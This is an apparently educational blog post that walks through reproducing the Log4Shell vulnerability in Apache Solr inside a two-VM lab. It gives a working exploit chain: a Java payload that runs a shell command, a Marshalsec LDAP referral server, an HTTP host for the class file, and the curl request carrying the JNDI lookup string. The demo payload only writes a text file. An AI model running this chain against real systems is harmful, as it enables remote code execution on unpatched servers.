---
title: "Reproducing the Log4Shell vulnerability (CVE-2021-44228)"
tags:
  - Log4Shell
  - CVE-2021-44228
  - Exploitation
  - Log4j
---
# Introduction
In this blog post we will be diving into the necessary steps to reproduce the Log4Shell vulnerability (CVE-2021-44228). Log4Shell is a software vulnerability in Apache Log4j2, a popular Java-based logging utility. The vulnerability has received lots of coverage on Social Media. I highly recommend watching the following videos if you wish to learn more about the background information of Log4Shell:
- [LiveOverflow: *Log4j Vulnerability (Log4Shell) Explained // CVE-2021-44228*](https://www.youtube.com/watch?v=w2F67LbEtnk)<br>
- [LiveOverflow: *Log4j Lookups in Depth // Log4Shell CVE-2021-44228 - Part 2*](https://www.youtube.com/watch?v=iI9Dz3zN4d8)<br>
- [John Hammond: *CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)*](https://www.youtube.com/watch?v=7qoPDq41xhQ)<br>

<br>

# Reproduction
## Virtual Environment setup
The virtual environment for reproducing the Log4Shell vulnerability consists of two virtual machines:
- VM1 (Windows 11 OS): hosts [Apache Solr 7.7.3](https://solr.apache.org/downloads.html), which uses a vulnerable version of Apache Log4j
- VM2 (Kali Linux OS):  hosts a simple HTTP server which contains our Java payload, and a LDAP referral server (using [Marshalsec](https://github.com/mbechler/marshalsec)) to redirect traffic to the HTTP server

We will use [VirtualBox](https://www.virtualbox.org/) to manage our virtual machines.

VM1 will get the 10.0.0.10 static IP address:<br>
![vm1ipv4settings.png](/assets/images/vm1ipv4settings.png)<br>
You can configure this by navigating to *Control Panel --> Network and Sharing Center --> Change adapter settings --> Right click on your network device --> Properties --> Internet Protocol Version 4 (TCP/IPv4) --> Properties*

VM2 will get the 10.0.0.11 static IP address:<br>
![vm2ipv4settings.png](/assets/images/vm2ipv4settings.png)<br>
You can configure this by entering the following command in a terminal: *sudo ifconfig eth0 10.0.0.11 netmask 255.0.0.0*

Once the static IP addresses are configured, make sure that both VM's can ping eachother:<br>
![ping01.png](/assets/images/ping01.png)<br>
<br>
![ping02.png](/assets/images/ping02.png)<br>
<br>

## Setting things up on VM1 (Windows 11 OS)
Apache Solr requires Java Runtime Environment (JRE) version 1.8 or higher in order to run. In this blog post we will use JDK 1.8.0_181. You can download it from the official Oracle website, but this will require you to sign up for an account first. You can also use a download mirror, such as:
https://mirrors.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-windows-x64.exe

After installing JDK 1.8.0_181 on your VM, download Solr 7.7.3 from https://solr.apache.org/downloads.html and unzip the file. Now open a new commandprompt and navigate to the directory in order to launch the application. I've unzipped Solr on my Desktop, so I will cd into ```C:\Users\User\Desktop\solr-7.7.3a\solr-7.7.3\bin``` and run the ```solr start``` command:<br>
![solrstart.png](/assets/images/solrstart.png)<br>

With the Solr server running, open your web browser and browse to [http://127.0.0.1:8983/](http://127.0.0.1:8983/). You should be presented with a dashboard that looks something like this:<br>
![solrdashboard.png](/assets/images/solrdashboard.png)<br>


## Setting things up on VM2 (Kali Linux OS)
Now that our target is reachable and running an application that is vulnerable to Log4Shell, it is time to prepare our attacking machine. First of, we need a Java payload that can be called when the target connects to our LDAP server. Save the code below, for example as ```/tmp/demo/Exploit.java```.<br>

```Java
public class Exploit {
  static {
    try {
      java.lang.Runtime.getRuntime().exec("cmd.exe /c echo Hello! > Log4Shelldemo.txt").waitFor();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
```

This payload is quite simple and harmless. All it does is put the text "Hello!" into a file called "Log4Shelldemo.txt".

Our payload needs to be compiled using the same Java version as the application that we're exploiting, so go ahead and download the Linux version of JDK 1.8.0_181 onto VM2 (mirror: https://mirrors.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz). Extract it using the ```tar -xvzf jdk-8u181-linux-x64.tar.gz``` command. <br> Now compile the payload by running ```./jdk1.8.0_181/bin/javac /tmp/demo/Exploit.java```:<br>
![compilepayload.png](/assets/images/compilepayload.png)<br>
This should result in a file called Exploit.class in our /tmp/demo directory:<br>
![exploitclass.png](/assets/images/exploitclass.png)<br>

We want to host this file on a simple HTTP server. In this case we will host it on port 8000 by running
```python3 -m http.server 8000 -d /tmp/demo```:<br>
![httpserver01.png](/assets/images/httpserver01.png)<br>

Next, using [Marshalsec](https://github.com/mbechler/marshalsec), we will run our malicious LDAP server to redirect traffic to the HTTP server with our payload. Follow these steps:
1. Install Maven by running ```sudo apt-get install maven```
2. ```cd /tmp```
3. ```git clone https://github.com/mbechler/marshalsec.git```
4. ```cd marshalsec```
5. ```mvn clean package -DskipTests```
6. ```cd target```
7. ``` java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.0.0.11:8000/#Exploit" ```

You should now have a running LDAP referral server that is listening on port 1389:<br>
![ldapserver01.png](/assets/images/ldapserver01.png)<br>

## Exploitation
Now that we have both a Java payload on a HTTP server and a malicious LDAP server to redirect the traffic, we can send our exploit string to the Apache Solr application. We will use cURL to send the following malicious GET request to our target:<br>```curl 'http://10.0.0.10:8983/solr/admin/cores?foo=$\{jndi:ldap://10.0.0.11:1389/Exploit\}' ```
Once the string gets parsed by the Log4j2 logger, the vulnerable application will reach out to the LDAP server and look for the "Exploit" object. It will then get redirected to the HTTP server, load our Exploit.class payload and execute it!

So, let's send the GET request:<br>
![getrequest01.png](/assets/images/getrequest01.png)<br>

Inside our other terminal window, we can see that the LDAP server successfully redirected the traffic:<br>
![ldapserver02.png](/assets/images/ldapserver02.png)<br>

And on our HTTP server, we can see a GET request from 10.0.0.10 for our Exploit.class payload with a status code of 200:<br>
![httpserver02.png](/assets/images/httpserver02.png)<br>

Back on our Windows 11 VM, let's browse to the Apache Solr server folder:<br>
![solrserver01.png](/assets/images/solrserver01.png)<br>
And as you can see, our Log4Shelldemo.txt file is right there. If we open it, it should contain the "Hello!" text:<br>
![log4shelldemo.png](/assets/images/log4shelldemo.png)<br>
This means that our payload was executed and the exploit was succesful! 
<br>
<br>
<br>

*Sources:*
1. *[https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)*
2. *[https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)*
3. *[https://www.perfacilis.com/blog/security/how-to-check-and-mitigate-the-log4j-vulnerability.html](https://www.perfacilis.com/blog/security/how-to-check-and-mitigate-the-log4j-vulnerability.html)*
4. *[https://solr.apache.org/guide/8_11/index.html](https://solr.apache.org/guide/8_11/index.html)*
5. *[https://securityboulevard.com/2021/12/log4shell-jndi-injection-via-attackable-log4j/](https://securityboulevard.com/2021/12/log4shell-jndi-injection-via-attackable-log4j/)*
6. *[LiveOverflow: *Log4j Vulnerability (Log4Shell) Explained // CVE-2021-44228*](https://www.youtube.com/watch?v=w2F67LbEtnk)*
7. *[LiveOverflow: *Log4j Lookups in Depth // Log4Shell CVE-2021-44228 - Part 2*](https://www.youtube.com/watch?v=iI9Dz3zN4d8)*
8. *[John Hammond: *CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)*](https://www.youtube.com/watch?v=7qoPDq41xhQ)*
